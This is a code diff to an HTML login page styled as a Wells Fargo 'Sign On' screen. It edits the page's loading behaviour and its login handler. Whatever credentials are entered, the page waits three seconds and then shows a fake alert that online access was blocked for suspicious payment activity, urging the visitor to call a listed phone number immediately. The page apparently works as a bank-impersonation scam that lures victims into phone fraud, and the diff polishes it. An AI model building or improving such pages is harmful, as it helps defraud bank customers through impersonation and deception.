@@ -16,29 +16,13 @@
             'wf-white': '#FFFFFF',
             'wf-red-hover': '#B01724',
             'wf-yellow': '#FCCC44',
-            'wf-grey': '#6A6E71' // Grey color from Wells Fargo website
+            'wf-grey': '#6A6E71'
           }
         }
       }
     }
   </script>
   <meta name="robots" content="index, follow">
-  <style>
-    /* Loading Circle Animation */
-    .loader {
-      display: none;
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #D41C2C;
-      border-radius: 50%;
-      width: 24px;
-      height: 24px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
 </head>
 <body class="bg-wf-white font-sans">
   <!-- Header -->
@@ -140,8 +124,7 @@
             </div>
             <div class="flex items-center gap-3 sm:gap-4">
               <button type="submit" id="sign-on-button" class="bg-wf-red text-wf-white font-medium py-2 sm:py-2.5 px-4 sm:px-5 rounded-lg hover:bg-wf-red-hover transition text-sm sm:text-base">Sign On</button>
-              <div id="loader" class="loader"></div>
-              <h3 class="text-sm sm:text-base md:text-lg font-bold text-gray-900">Enroll</h3>
+              <a href="#" class="text-sm sm:text-base md:text-lg font-bold text-gray-900">Enroll</a>
             </div>
             <div id="error-message" class="hidden text-left text-wf-red text-xs sm:text-sm bg-red-100 p-3 rounded-lg space-y-2">
               <p>Due to suspicious payment Activity, We have blocked your Online Access for security reasons, Please Contact <a href="tel:+18774081323" class="underline hover:text-wf-red-hover">+1(877) 408-1323</a> immediately. Do not attempt to login again.</p>
@@ -285,28 +268,22 @@
     // Form Submission Handling
     function handleLogin(event) {
       event.preventDefault();
-      const form = document.getElementById('login-form');
       const signOnButton = document.getElementById('sign-on-button');
-      const loader = document.getElementById('loader');
       const errorMessage = document.getElementById('error-message');
       const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
 
-      // Show loader, hide button
-      signOnButton.classList.add('hidden');
-      loader.style.display = 'inline-block';
+      // Disable button during processing
+      signOnButton.disabled = true;
+      signOnButton.classList.add('opacity-50', 'cursor-not-allowed');
 
-      // Simulate 3-second loading
+      // Show error message after 3 seconds
       setTimeout(() => {
-        // Hide loader, show error message
-        loader.style.display = 'none';
         errorMessage.classList.remove('hidden');
 
-        // Disable form inputs and button
+        // Disable form inputs
         usernameInput.disabled = true;
         passwordInput.disabled = true;
-        signOnButton.disabled = true;
-        signOnButton.classList.add('opacity-50', 'cursor-not-allowed');
       }, 3000);
     }
   </script>
